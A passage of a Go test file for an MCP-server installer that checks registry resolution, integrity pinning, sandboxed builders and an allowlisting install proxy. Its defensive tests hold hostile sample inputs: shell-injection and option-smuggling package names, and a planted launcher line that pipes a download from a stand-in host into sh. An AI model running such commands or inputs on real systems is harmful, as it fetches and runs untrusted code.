package mcpinstall

import (
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/blaktron/agentry/pkg/manifest"

	"github.com/blaktron/agentry-cli/pkg/runner/dockerx"
	"github.com/blaktron/agentry-cli/pkg/runner/owner"
	"github.com/blaktron/agentry-cli/pkg/runner/policy"
	"github.com/blaktron/agentry-cli/pkg/runner/receipt"
)

// fakeRegistries serves just enough npm + PyPI metadata for resolution.
func fakeRegistries(t *testing.T) policy.MCPRegistries {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("GET /@scope%2Fserver-x/1.2.3", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"name":"@scope/server-x","bin":{"server-x":"dist/cli.js"},"engines":{"node":">=20"},"dist":{"tarball":"t","integrity":"sha512-AAA"}}`))
	})
	mux.HandleFunc("GET /no-bin/1.0.0", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"name":"no-bin","dist":{"tarball":"t","integrity":"sha512-BBB"}}`))
	})
	mux.HandleFunc("GET /pypi/mcp-server-fetch/0.6.2/json", func(w http.ResponseWriter, _ *http.Request) {
		// A platform wheel listed first, then the pure-Python one, then the
		// sdist: the pin must prefer none-any and record all three.
		_, _ = w.Write([]byte(`{"info":{"requires_python":">=3.10"},"urls":[
		  {"packagetype":"bdist_wheel","filename":"mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl","digests":{"sha256":"beef"}},
		  {"packagetype":"bdist_wheel","filename":"mcp_server_fetch-0.6.2-py3-none-any.whl","digests":{"sha256":"cafe"}},
		  {"packagetype":"sdist","filename":"mcp_server_fetch-0.6.2.tar.gz","digests":{"sha256":"f00d"}}]}`))
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return policy.MCPRegistries{NPM: srv.URL, PyPI: srv.URL}
}

// httpsRegs is regs with https URLs: the install proxy tunnels https
// only, so EnsureInstalled refuses anything else, while the resolution
// tests' fake registry is a plain httptest server that EnsureInstalled
// never contacts.
func httpsRegs(regs policy.MCPRegistries) policy.MCPRegistries {
	regs.NPM = strings.Replace(regs.NPM, "http://", "https://", 1)
	regs.PyPI = strings.Replace(regs.PyPI, "http://", "https://", 1)
	return regs
}

// withRunner marks the runner image built, as the install step leaves it
// before any server is installed: the install proxy runs from it.
func withRunner(f *dockerx.Fake) *dockerx.Fake {
	if f.ExistingImages == nil {
		f.ExistingImages = map[string]bool{}
	}
	f.ExistingImages[proxyImage(policy.Images{})] = true
	return f
}

func foregroundCalls(f *dockerx.Fake) int {
	n := 0
	for _, c := range f.Calls {
		if c.Op == "RunForeground" {
			n++
		}
	}
	return n
}

func decl(npm, pypi, version string) manifest.MCPServer {
	return manifest.MCPServer{NPM: npm, PyPI: pypi, Version: version}
}

func TestResolveAll(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{
		decl("@scope/server-x", "", "1.2.3"),
		decl("", "mcp-server-fetch", "0.6.2"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if res[0].BinName != "server-x" || res[0].Integrity != "sha512-AAA" {
		t.Fatalf("npm resolution = %+v", res[0])
	}
	// The release's own runtime range is recorded (agentry-cli#609).
	if res[0].DeclaredRuntime != ">=20" || res[1].DeclaredRuntime != ">=3.10" {
		t.Fatalf("declared runtimes = %q, %q", res[0].DeclaredRuntime, res[1].DeclaredRuntime)
	}
	if res[0].ID != "npm-scope-server-x" {
		t.Fatalf("npm id = %q", res[0].ID)
	}
	if got := res[0].Command(); got[0] != "/opt/agentry-mcp/npm-scope-server-x/node_modules/.bin/server-x" {
		t.Fatalf("npm command = %v", got)
	}
	if res[1].Integrity != "sha256:cafe" || res[1].BinName != "mcp-server-fetch" {
		t.Fatalf("pypi resolution = %+v", res[1])
	}
	if len(res[1].Artifacts) != 3 || res[1].Artifacts["mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl"] != "beef" {
		t.Fatalf("pypi artifacts = %v, want all three advertised files", res[1].Artifacts)
	}
	if got := res[1].Command(); !strings.HasSuffix(got[0], "/venv/bin/mcp-server-fetch") {
		t.Fatalf("pypi command = %v", got)
	}
}

func TestResolveRefusesBinlessPackage(t *testing.T) {
	regs := fakeRegistries(t)
	_, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("no-bin", "", "1.0.0")})
	if err == nil || !strings.Contains(err.Error(), "no bin") {
		t.Fatalf("binless package not refused: %v", err)
	}
}

func TestEnsureInstalledRunsBuilderOnceAndReuses(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err != nil {
		t.Fatal(err)
	}
	store := t.TempDir()
	fake := &dockerx.Fake{}
	withRunner(fake)
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}

	if err := EnsureInstalled(t.Context(), fake, res, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("builder ran %d times, want 1", n)
	}
	// The installer's name is fixed per server: it must remove itself, or
	// the next agent declaring the same server cannot install it (#106).
	if run, ok := fake.FindRun("agentry-mcpinstall-"); !ok || !run.AutoRemove {
		t.Fatalf("installer container not auto-removed: %+v", run)
	}
	// A CLI killed mid-install leaves the builder running; its owner labels
	// are what the next run's sweep removes it by (agentry-cli#161).
	if run, _ := fake.FindRun("agentry-mcpinstall-"); run.Labels["agentry.mcpinstall"] == "" {
		t.Fatalf("installer labels = %v, want the server it builds", run.Labels)
	} else if own := owner.Labels(); own != nil && run.Labels[owner.LabelPID] != own[owner.LabelPID] {
		t.Fatalf("installer labels = %v, want this process as owner", run.Labels)
	}
	// The store is the user's (#112): the builder runs as the invoking
	// uid:gid so `rm -rf` of the profile works afterwards, with npm's home
	// and cache pointed at /tmp, where that user can write in the image.
	if run, _ := fake.FindRun("agentry-mcpinstall-"); run.User != invokingUser() || run.User == "" {
		t.Fatalf("installer runs as %q, want the invoking user %q", run.User, invokingUser())
	} else if len(run.Argv) < 3 || run.Argv[0] != "env" || run.Argv[1] != "HOME=/tmp" || run.Argv[2] != "npm_config_cache=/tmp/npm-cache" {
		t.Fatalf("npm not given a writable HOME and cache: %v", run.Argv)
	}
	if _, err := os.Stat(filepath.Join(store, "npm-scope-server-x.json")); err != nil {
		t.Fatalf("resolution not recorded: %v", err)
	}

	// Second install of the SAME resolution: pure reuse, no docker.
	res2, _ := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err := EnsureInstalled(t.Context(), fake, res2, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("reuse still ran the builder (count %d)", n)
	}
}

func TestEnsureInstalledRefusesDrift(t *testing.T) {
	store := t.TempDir()
	fake := &dockerx.Fake{}
	withRunner(fake)
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "https://unused.invalid", PyPI: "https://unused.invalid"}

	first := []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-OLD"}}
	if err := EnsureInstalled(t.Context(), fake, first, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	drifted := []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-NEW"}}
	err := EnsureInstalled(t.Context(), fake, drifted, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "trust decision") {
		t.Fatalf("integrity drift not refused: %v", err)
	}
}

func TestSpecsCarryManifestFilters(t *testing.T) {
	servers := []manifest.MCPServer{{
		NPM: "@scope/server-x", Version: "1.2.3",
		Tools: []string{"list_issues"}, Secrets: []string{"GITHUB_PAT"}, Egress: []string{"api.github.com"},
	}}
	res := []Resolved{{Source: "npm", Package: "@scope/server-x", Version: "1.2.3", ID: "npm-scope-server-x", BinName: "server-x"}}
	specs := Specs(res, servers, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"})
	s := specs[0]
	if s.Name != "mcp-npm-scope-server-x" || s.Image != "node:test" {
		t.Fatalf("spec = %+v", s)
	}
	if len(s.Tools) != 1 || len(s.Secrets) != 1 || s.Egress[0] != "api.github.com" {
		t.Fatalf("filters not carried: %+v", s)
	}
}

// PyPI installs are wheel-only and verify the pinned artifact against the
// registry's advertised digests before installing (agentry-cli#4); policy
// can opt back into source distributions.
func TestEnsureInstalledPyPIVerifiesWheels(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("", "mcp-server-fetch", "0.6.2")})
	if err != nil {
		t.Fatal(err)
	}
	store := t.TempDir()
	fake := &dockerx.Fake{}
	withRunner(fake)
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	if err := EnsureInstalled(t.Context(), fake, res, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	run, ok := fake.FindRun("agentry-mcpinstall-pypi-")
	if !ok {
		t.Fatal("no PyPI builder ran")
	}
	// The program is fixed; the values follow it one per element.
	want := []string{"python", "-c", pypiBuilder, "/opt/agentry-mcp/pypi-mcp-server-fetch", "mcp-server-fetch", "0.6.2", httpsRegs(regs).PyPI + "/simple", "--only-binary=:all:"}
	if !slices.Equal(run.Argv, want) {
		t.Errorf("builder argv = %q\nwant %q", run.Argv[3:], want[3:])
	}
	sums, err := os.ReadFile(filepath.Join(store, res[0].ID, "artifacts.sha256"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(sums), "cafe  mcp_server_fetch-0.6.2-py3-none-any.whl") ||
		!strings.Contains(string(sums), "beef  mcp_server_fetch-0.6.2-cp312-manylinux_x86_64.whl") {
		t.Fatalf("artifact digests file = %q", sums)
	}

	// Policy opt-in: source distributions allowed → no --only-binary.
	regs.PyPIAllowSourceDists = true
	if a := pipArgv(&res[0], regs); a[len(a)-1] != "" {
		t.Fatalf("pypiAllowSourceDists still wheel-only: %q", a[3:])
	}
}

// A PyPI server's launchable entry is the console script the installed
// distribution declares, not the project name (agentry-cli#13 / DR-11):
// the builder records entry points, the host adopts the right one, and a
// later reuse of the store carries the recorded name.
func TestEnsureInstalledPyPIAdoptsDeclaredConsoleScript(t *testing.T) {
	store := t.TempDir()
	fake := &dockerx.Fake{
		ExistingImages: map[string]bool{"python:test": true, proxyImage(policy.Images{}): true},
		Foreground: map[string]*dockerx.FakeForeground{
			"agentry-mcpinstall-pypi-some-tool": {Before: func(r dockerx.RunSpec) {
				if err := os.WriteFile(filepath.Join(r.Mounts[0].Source, consoleScriptsFile), []byte("some-tool-cli\nsome_tool\n"), 0o600); err != nil {
					t.Error(err)
				}
			}},
		},
	}
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "https://unused.invalid", PyPI: "https://unused.invalid"}
	res := []Resolved{{Source: "pypi", Package: "Some.Tool", Version: "1.0.0", ID: "pypi-some-tool", BinName: "some-tool", Integrity: "sha256:aa"}}
	if err := EnsureInstalled(t.Context(), fake, res, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if res[0].BinName != "some_tool" {
		t.Fatalf("BinName = %q, want the declared script matching the project name", res[0].BinName)
	}
	if got := res[0].Command()[0]; !strings.HasSuffix(got, "/venv/bin/some_tool") {
		t.Fatalf("command = %q", got)
	}
	// Reuse: the fresh resolution only knows the guess; the store knows better.
	again := []Resolved{{Source: "pypi", Package: "Some.Tool", Version: "1.0.0", ID: "pypi-some-tool", BinName: "some-tool", Integrity: "sha256:aa"}}
	installOps := len(fake.Ops())
	if err := EnsureInstalled(t.Context(), fake, again, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if again[0].BinName != "some_tool" {
		t.Fatalf("reused BinName = %q", again[0].BinName)
	}
	if n := len(fake.Ops()); n != installOps { // reuse touches docker not at all
		t.Fatalf("docker ops on reuse: %v", fake.Ops()[installOps:])
	}
}

func TestChooseConsoleScript(t *testing.T) {
	cases := []struct {
		pkg   string
		names []string
		want  string
		ok    bool
	}{
		{"mcp-server-fetch", []string{"mcp-server-fetch"}, "mcp-server-fetch", true},
		{"mcp_server_fetch", []string{"other", "mcp-server-fetch"}, "mcp-server-fetch", true},
		{"Some.Tool", []string{"sometool-cli"}, "sometool-cli", true},
		{"pkg", []string{"zeta", "alpha", ""}, "alpha", true},
		{"pkg", []string{"", "  "}, "", false},
		{"pkg", nil, "", false},
	}
	for _, c := range cases {
		got, ok := chooseConsoleScript(c.pkg, c.names)
		if got != c.want || ok != c.ok {
			t.Errorf("chooseConsoleScript(%q, %v) = %q,%v want %q,%v", c.pkg, c.names, got, ok, c.want, c.ok)
		}
	}
	if normalizePyPIName("Mcp__Server.Fetch-") != "mcp-server-fetch" {
		t.Fatal(normalizePyPIName("Mcp__Server.Fetch-"))
	}
}

// The builder program names the files the Go side writes and reads, and
// records the dist's console scripts only after installing it.
func TestPypiBuilderProgram(t *testing.T) {
	for _, want := range []string{`ARTIFACT_SUMS = "` + artifactSumsFile + `"`, `CONSOLE_SCRIPTS_FILE = "` + consoleScriptsFile + `"`, "console_scripts"} {
		if !strings.Contains(pypiBuilder, want) {
			t.Errorf("pypi_builder.py lacks %q", want)
		}
	}
	if strings.Index(pypiBuilder, `run([pip, "install"`) > strings.LastIndex(pypiBuilder, "CONSOLE_SCRIPTS,") {
		t.Fatal("console scripts must be read after pip install")
	}
}

// No manifest value reaches a shell (agentry-cli#162): a package name
// carrying shell syntax is one argv element of a fixed program, and the
// builder refuses it before any container runs, as it refuses a value pip
// or npm would read as an option or an npm spec that is not a registry
// version.
func TestBuilderValuesNeverReachAShell(t *testing.T) {
	evil := Resolved{Source: "pypi", Package: "x; touch /tmp/x", Version: "1.0", ID: "pypi-x"}
	argv := pipArgv(&evil, policy.MCPRegistries{PyPI: "http://pypi.invalid"})
	if argv[0] != "python" || argv[1] != "-c" || argv[2] != pypiBuilder || argv[4] != "x; touch /tmp/x" || len(argv) != 8 {
		t.Fatalf("argv = %q", argv[3:])
	}
	for _, a := range argv {
		if a == "sh" || a == "bash" {
			t.Fatalf("a shell in the builder argv: %q", argv)
		}
	}

	cases := []struct{ src, pkg, version string }{
		{"pypi", "x; touch /tmp/x", "1.0"},
		{"pypi", "--index-url=http://evil.invalid", "1.0"},
		{"pypi", "fine", "1.0 --pre"},
		{"npm", "server-x", "file:../../etc"},
		{"npm", "server-x", "http://evil.invalid/x.tgz"},
		{"npm", "-g", "1.0.0"},
		{"npm", "server-x", ""},
	}
	for _, c := range cases {
		fake := &dockerx.Fake{}
		withRunner(fake)
		r := []Resolved{{Source: c.src, Package: c.pkg, Version: c.version, ID: c.src + "-x", BinName: "x"}}
		err := EnsureInstalled(t.Context(), fake, r, t.TempDir(), policy.MCPRegistries{NPM: "https://n.invalid", PyPI: "https://p.invalid"},
			policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, policy.DockerPolicy{}, io.Discard)
		if err == nil || !strings.Contains(err.Error(), "builder will pass on") || len(fake.Calls) != 0 {
			t.Errorf("%s %q@%q: err=%v docker calls=%v", c.src, c.pkg, c.version, err, fake.Ops())
		}
		d := manifest.MCPServer{Version: c.version}
		if c.src == "npm" {
			d.NPM = c.pkg
		} else {
			d.PyPI = c.pkg
		}
		if _, err := ResolveAll(t.Context(), nil, policy.MCPRegistries{NPM: "https://n.invalid", PyPI: "https://p.invalid"}, []manifest.MCPServer{d}); err == nil || !strings.Contains(err.Error(), "builder will pass on") {
			t.Errorf("resolve %s %q@%q: %v", c.src, c.pkg, c.version, err)
		}
	}
	for _, ok := range [][2]string{{"@scope/server-x", "1.2.3-rc.1+build.5"}, {"mcp_server.fetch", "0.6.2.post1"}} {
		if err := builderArgs(ok[0], ok[1]); err != nil {
			t.Errorf("builderArgs(%q, %q) = %v", ok[0], ok[1], err)
		}
	}
}

// The builder's only route out is the install proxy (agentry-cli#92,
// DR-12): an internal network of its own, where the runner image's proxy
// allows the configured registry and the artifact hosts the registry's
// metadata named, and nothing else; the builder is told the proxy by the
// proxy variables. The proxy's decisions are kept beside the record, the
// record names the allowlist, and the proxy and the network go when the
// build ends.
func TestEnsureInstalledRoutesTheBuilderThroughTheInstallProxy(t *testing.T) {
	cases := []struct {
		decl      manifest.MCPServer
		regs      policy.MCPRegistries
		resolved  Resolved
		wantAllow []string
	}{
		{
			decl:      decl("@scope/server-x", "", "1.2.3"),
			regs:      policy.MCPRegistries{NPM: "https://registry.npmjs.org", PyPI: "https://pypi.org"},
			resolved:  Resolved{Source: "npm", Package: "@scope/server-x", Version: "1.2.3", ID: "npm-scope-server-x", BinName: "server-x", Integrity: "sha512-A"},
			wantAllow: []string{"registry.npmjs.org:443"},
		},
		{
			decl: decl("", "mcp-server-fetch", "0.6.2"),
			regs: policy.MCPRegistries{NPM: "https://registry.npmjs.org", PyPI: "https://pypi.org"},
			resolved: Resolved{Source: "pypi", Package: "mcp-server-fetch", Version: "0.6.2", ID: "pypi-mcp-server-fetch", BinName: "mcp-server-fetch", Integrity: "sha256:aa",
				FetchHosts: []string{"files.pythonhosted.org:443"}},
			wantAllow: []string{"files.pythonhosted.org:443", "pypi.org:443"},
		},
	}
	for _, c := range cases {
		t.Run(c.decl.SourceID(), func(t *testing.T) {
			store := t.TempDir()
			id := c.resolved.ID
			fake := withRunner(&dockerx.Fake{LogsByName: map[string]string{installProxyName(id): "allow pypi.org:443\ndeny evil.example:443\n"}})
			res := []Resolved{c.resolved}
			if err := EnsureInstalled(t.Context(), fake, res, store, c.regs, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, policy.DockerPolicy{Runtime: "runsc"}, io.Discard); err != nil {
				t.Fatal(err)
			}
			ops := fake.Ops()
			net := installNetworkName(id)
			for _, want := range []string{
				"NetworkCreate:" + net + "(internal=true)",
				"RunDetached:" + installProxyName(id),
				"NetworkConnect:bridge<-" + installProxyName(id),
				"RemoveForce:" + installProxyName(id),
				"NetworkRemove:" + net,
			} {
				if !slices.Contains(ops, want) {
					t.Errorf("docker ops lack %q: %v", want, ops)
				}
			}
			proxy, ok := fake.FindRun(installProxyName(id))
			if !ok {
				t.Fatal("no install proxy ran")
			}
			wantArgv := []string{"proxy", "--allow", strings.Join(c.wantAllow, ","), "--addr", ":3128"}
			if proxy.Image != proxyImage(policy.Images{}) || !slices.Equal(proxy.Argv, wantArgv) || proxy.Network != net || proxy.Alias != installProxyAlias {
				t.Errorf("install proxy = image %q argv %q network %q alias %q; want %q %q", proxy.Image, proxy.Argv, proxy.Network, proxy.Alias, proxyImage(policy.Images{}), wantArgv)
			}
			// The runner's own binary on the daemon's default: it resolves
			// the registry through docker's DNS (agentry-cli#221).
			if proxy.Runtime != "" || !proxy.ReadOnly || !proxy.NoNewPrivileges {
				t.Errorf("install proxy posture: runtime %q readOnly %v noNewPrivileges %v", proxy.Runtime, proxy.ReadOnly, proxy.NoNewPrivileges)
			}
			builder, ok := fake.FindRun("agentry-mcpinstall-" + id)
			if !ok {
				t.Fatal("no builder ran")
			}
			if builder.Network != net {
				t.Errorf("builder network = %q, want the install network %q (never the bridge)", builder.Network, net)
			}
			if got := builder.Env["HTTPS_PROXY"]; got != "http://mcp-install-proxy:3128" || builder.Env["https_proxy"] != got || builder.Env["npm_config_https_proxy"] != got || builder.Env["PIP_PROXY"] != got {
				t.Errorf("builder proxy env = %v", builder.Env)
			}
			logb, err := os.ReadFile(filepath.Join(store, id+installProxyLogSuffix))
			if err != nil || !strings.Contains(string(logb), "deny evil.example:443") {
				t.Errorf("install proxy log = %q, %v", logb, err)
			}
			meta, err := LoadMeta(store, id)
			if err != nil || meta == nil || !slices.Equal(meta.InstallEgress, c.wantAllow) {
				t.Errorf("recorded install egress = %+v, %v; want %q", meta, err, c.wantAllow)
			}
		})
	}
}

// The proxy tunnels https only, so a plain-http registry is refused before
// anything starts, and so is a missing runner image, which docker would
// otherwise try to pull under a name that is only ever built locally.
func TestEnsureInstalledRefusesWhatTheInstallProxyCannotCarry(t *testing.T) {
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	res := func() []Resolved {
		return []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-A"}}
	}
	fake := withRunner(&dockerx.Fake{})
	err := EnsureInstalled(t.Context(), fake, res(), t.TempDir(), policy.MCPRegistries{NPM: "http://registry.example", PyPI: "https://pypi.org"}, images, policy.DockerPolicy{}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "https") {
		t.Errorf("an http registry: %v", err)
	}
	if foregroundCalls(fake) != 0 || len(fake.Ops()) != 0 {
		t.Errorf("an http registry still touched docker: %v", fake.Ops())
	}
	bare := &dockerx.Fake{ExistingImages: map[string]bool{"node:test": true}}
	err = EnsureInstalled(t.Context(), bare, res(), t.TempDir(), policy.MCPRegistries{NPM: "https://registry.npmjs.org", PyPI: "https://pypi.org"}, images, policy.DockerPolicy{}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "not built") {
		t.Errorf("no runner image: %v", err)
	}
	if foregroundCalls(bare) != 0 {
		t.Error("the builder ran without its proxy")
	}
}

// Resolution records where the pinned artifact is fetched from, when that
// is not the registry itself: npm's tarball host, PyPI's file host. Only
// https URLs count; the registry's own host is not repeated.
func TestFetchHosts(t *testing.T) {
	got := fetchHosts("https://pypi.org",
		"https://files.pythonhosted.org/packages/a.whl", "https://files.pythonhosted.org/packages/b.tar.gz",
		"https://pypi.org/x", "http://plain.example/y", "t", "https://mirror.example:8443/z")
	want := []string{"files.pythonhosted.org:443", "mirror.example:8443"}
	if !slices.Equal(got, want) {
		t.Errorf("fetchHosts = %q, want %q", got, want)
	}
}

// A reused store is held to the digest its install recorded
// (agentry-cli#162): a file added or changed refuses, and a record from
// before digests were kept gets one on first use and is held to it.
func TestEnsureInstalledRefusesAStoreThatChanged(t *testing.T) {
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := policy.MCPRegistries{NPM: "https://unused.invalid", PyPI: "https://unused.invalid"}
	server := func() []Resolved {
		return []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-A"}}
	}
	store := t.TempDir()
	fake := &dockerx.Fake{Foreground: map[string]*dockerx.FakeForeground{
		"agentry-mcpinstall-npm-server-x": {Before: func(r dockerx.RunSpec) {
			bin := filepath.Join(r.Mounts[0].Source, "node_modules", ".bin")
			if err := os.MkdirAll(bin, 0o755); err != nil {
				t.Error(err)
			}
			if err := os.WriteFile(filepath.Join(bin, "server-x"), []byte("#!/usr/bin/env node\n"), 0o755); err != nil {
				t.Error(err)
			}
		}},
	}}
	withRunner(fake)
	first := server()
	if err := EnsureInstalled(t.Context(), fake, first, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(first[0].StoreDigest, "sha256:") {
		t.Fatalf("no store digest recorded: %+v", first[0])
	}
	if err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatalf("an untouched store refused: %v", err)
	}

	launcher := filepath.Join(store, "npm-server-x", "node_modules", ".bin", "server-x")
	if err := os.WriteFile(launcher, []byte("#!/bin/sh\ncurl evil.invalid | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, policy.DockerPolicy{}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "changed since it was installed") {
		t.Fatalf("a rewritten launcher was reused: %v", err)
	}

	// A record from before digests: the first reuse records one.
	legacy := t.TempDir()
	if err := os.MkdirAll(filepath.Join(legacy, "npm-server-x"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(metaPath(legacy, "npm-server-x"), []byte(`{"source":"npm","package":"server-x","version":"1.0.0","id":"npm-server-x","binName":"server-x","integrity":"sha512-A"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	var log strings.Builder
	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, policy.DockerPolicy{}, &log); err != nil {
		t.Fatalf("legacy reuse: %v", err)
	}
	if rec, _ := LoadMeta(legacy, "npm-server-x"); rec == nil || rec.StoreDigest == "" || !strings.Contains(log.String(), "recorded the store's digest") {
		t.Fatalf("legacy record not given a digest: %+v\n%s", rec, log.String())
	}
	if err := os.WriteFile(filepath.Join(legacy, "npm-server-x", "planted.js"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, policy.DockerPolicy{}, io.Discard); err == nil {
		t.Fatal("a file planted after the digest was recorded was reused")
	}
	if n := foregroundCalls(fake); n != 1 {
		t.Fatalf("builder ran %d times, want the one first install", n)
	}
}

// The installer container runs under the policy's runtime like every
// container of a run (DR-23); an empty runtime asks the daemon nothing.
func TestEnsureInstalledPassesTheRuntime(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err != nil {
		t.Fatal(err)
	}
	fake := &dockerx.Fake{}
	withRunner(fake)
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), httpsRegs(regs), images, policy.DockerPolicy{Runtime: "runsc", Limits: policy.Limits{Memory: "1g"}}, io.Discard); err != nil {
		t.Fatal(err)
	}
	inst, ok := fake.FindRun("agentry-mcpinstall-")
	if !ok || inst.Runtime != "runsc" {
		t.Fatalf("installer runtime = %q (found %v), want runsc", inst.Runtime, ok)
	}
	// A sandboxed builder cannot ask docker's DNS for the install proxy
	// (agentry-cli#221): its alias is pinned; the proxy itself resolves the
	// registry through that DNS and stays on the daemon's default.
	if len(inst.ExtraHosts) != 1 || !strings.HasPrefix(inst.ExtraHosts[0], "mcp-install-proxy:") {
		t.Fatalf("installer extra hosts = %v, want the install proxy pinned", inst.ExtraHosts)
	}
	if proxy, ok := fake.FindRun("agentry-mcpproxy-"); !ok || proxy.Runtime != "" {
		t.Fatalf("install proxy runtime = %q (found %v), want the daemon's default", proxy.Runtime, ok)
	}
	// The run's container posture too (agentry-cli#163), the policy's
	// memory and the defaults for what it left unset.
	if len(inst.CapDrop) != 1 || inst.CapDrop[0] != "ALL" || !inst.NoNewPrivileges || inst.Memory != "1g" ||
		inst.CPUs != policy.DefaultCPUs || inst.PidsLimit != policy.DefaultPids {
		t.Fatalf("installer posture: cap-drop %v nnp %v memory %q cpus %d pids %d", inst.CapDrop, inst.NoNewPrivileges, inst.Memory, inst.CPUs, inst.PidsLimit)
	}
	// With the host's name servers the proxy runs under the runtime too
	// (agentry-cli#337): on an egress network of the install's own, joined
	// at create, reading a resolv.conf of its own; nothing is connected
	// after it starts, and both networks and the file go with the install.
	// The file is bound from under the server store, a path the docker
	// daemon finds as the CLI does: a sandbox host's runhost runs the CLI
	// in a container sharing only its runner home with the host, and a
	// file in the process's temporary directory was missing on the
	// daemon's side (agentry-cli#627). One a killed install left behind is
	// swept when the next starts.
	fake3 := &dockerx.Fake{}
	withRunner(fake3)
	store3 := t.TempDir()
	stale := filepath.Join(store3, "."+res[0].ID+".dns-killed")
	if err := os.MkdirAll(stale, 0o755); err != nil {
		t.Fatal(err)
	}
	var conf string
	var relabel bool
	fake3.OnDetached = func(r dockerx.RunSpec) {
		for _, m := range r.Mounts {
			if m.Target == "/etc/resolv.conf" && m.ReadOnly {
				b, _ := os.ReadFile(m.Source)
				conf, relabel = m.Source+"\n"+string(b), m.Relabel
			}
		}
	}
	if err := EnsureInstalled(t.Context(), fake3, res, store3, httpsRegs(regs), images, policy.DockerPolicy{Runtime: "runsc", Resolvers: []string{"192.0.2.53"}}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if path, _, _ := strings.Cut(conf, "\n"); !strings.HasPrefix(path, store3+string(filepath.Separator)) || !relabel {
		t.Errorf("the install proxy's resolv.conf is bound from %q (relabel %v), want a file this install made under the server store %q", path, relabel, store3)
	}
	if _, err := os.Stat(stale); !os.IsNotExist(err) {
		t.Errorf("a killed install's resolv.conf directory was not swept: %v", err)
	}
	proxy, _ := fake3.FindRun("agentry-mcpproxy-")
	if proxy.Runtime != "runsc" || len(proxy.ExtraNetworks) != 1 || !strings.HasSuffix(proxy.ExtraNetworks[0], "-out") {
		t.Fatalf("install proxy runtime = %q networks %v, want runsc on the install's egress network", proxy.Runtime, proxy.ExtraNetworks)
	}
	if !strings.Contains(conf, "nameserver 192.0.2.53\n") {
		t.Fatalf("the install proxy's resolv.conf = %q", conf)
	}
	started, removedAfter := false, false
	for _, c := range fake3.Calls {
		if c.Op == "NetworkConnect" {
			t.Errorf("a connect after start under the runtime: %s", c.Arg)
		}
		if c.Op == "RunDetached" && c.Arg == proxy.Name {
			started = true
		}
		if c.Op == "NetworkRemove" && c.Arg == proxy.ExtraNetworks[0] && started {
			removedAfter = true
		}
	}
	if !removedAfter {
		t.Error("the install's egress network was left behind")
	}
